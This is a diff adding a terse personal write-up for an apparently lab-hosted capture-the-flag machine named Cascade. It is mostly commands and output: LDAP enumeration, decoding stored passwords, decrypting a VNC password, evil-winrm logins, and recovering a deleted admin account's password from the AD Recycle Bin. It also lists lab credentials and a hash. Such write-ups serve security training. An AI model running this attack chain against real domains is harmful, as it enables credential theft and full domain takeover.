@@ -1,0 +1,94 @@
+ldapsearch -x -h 10.10.10.182 -b "dc=CASCADE,dc=local"
+user: r.thompson
+cascadeLegacyPwd: clk0bjVldmE= (base64?)
+
+echo "clk0bjVldmE=" | base64 -d
+
+rY4n5eva
+
+sudo smbclient -L 10.10.10.182 -U r.thompson
+Enter WORKGROUP\r.thompson's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        Audit$          Disk      
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+
+
+found some files using smbclient
+'VNC Install.reg' contains a line called "Password":hex
+echo "6b,cf,2a,4b,6e,5a,ca,0f" > hex
+echo "a88qS25ayg8=" | base64 -d > password
+
+/opt$ sudo git clone https://github.com/jeroennijhof/vncpwd.git
+sudo gcc -o vncpwd vncpwd.c d3des.c
+sudo ./vncpwd /home/bissorm/htb/writeups/cascade-htb/password
+sT333ve2
+
+sudo evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
+
+user :)
+
+*Evil-WinRM* PS C:\users> dir
+
+
+    Directory: C:\users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/25/2020  11:17 AM                Administrator
+d-----        1/28/2020  11:37 PM                arksvc
+d-r---        7/14/2009   5:57 AM                Public
+d-----        1/15/2020  10:22 PM                s.smith
+
+
+looking at the smblclient first command result, there is a "Audit" in the Shares
+found Audit.db and two files, an .dll and .exe
+
+sqlitebrowser Audit.db
+in the browser data tab, selected LDAP
+
+pwd: BQO5l5Kj9MdErXx6Q6AGOw==
+decrypt b64 resulted in not useful data
+
+let's try reverse with dnSpy using windows
+just download and run :)
+i need to use my host machine, since windows vm is to havy to my notebook :( (I need a new pc)
+decrypted string: dzNsYzBtZUZyMzFuZA== (base64)
+pass: w3lc0meFr31nd
+
+sudo evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+
+whoami /all
+
+CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
+CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
+
+how to see deleted objects using ad recovery bin powershell -> https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html
+Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" –IncludeDeletedObjects
+
+confirming the .html info, TempAdmin was deleted
+
+how to recover deleted objects using ad recovery bin powershell -> https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
+Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
+
+TempAdmin -> cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
+
+echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
+
+
+sudo evil-winrm -u Administrator -p 'baCT3r1aN00dles' -i 10.10.10.182
+
+echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:7c2ea40b06d267f1557a09ac086b4487:::" | md5sum
+
+root! :)
